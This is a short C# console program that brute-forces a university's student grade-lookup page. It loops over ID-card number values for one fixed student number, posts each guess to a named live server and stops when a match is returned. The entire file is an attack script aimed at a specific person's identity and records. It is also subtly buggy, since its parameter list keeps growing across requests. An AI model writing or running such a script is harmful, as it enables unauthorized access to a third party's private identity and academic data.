using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApplication1
{
  public  class Program
    {
        static  List<KeyValuePair<String, String>> paramList = new List<KeyValuePair<String, String>>();
        static string tempString;
        static int idNum = 001500;
        static void Main(string[] args)
        {
            int tiem = 0;
            while (true)
            {
                paramList.Add(new KeyValuePair<string, string>("xh", "2015213756"));
                paramList.Add(new KeyValuePair<string, string>("sfzh", idNum.ToString()));
                HttpClient httpClient = new HttpClient();
                string uri = $"http://jwc.cqupt.edu.cn/showStuQmcj.php";
                System.Net.Http.HttpResponseMessage response;
                response = httpClient.PostAsync(new Uri(uri), new FormUrlEncodedContent(paramList)).Result;
                if (response.StatusCode == HttpStatusCode.OK)
                    tempString = response.Content.ReadAsStringAsync().Result;

                if (tempString != "未查到匹配学生信息")
                {
                    Console.WriteLine(idNum);
                    break;
                }
                else
                {
                    idNum++;
                    Console.WriteLine("爆破中 "+tiem);
                    tiem++;
                }
            }
        }
    }
}
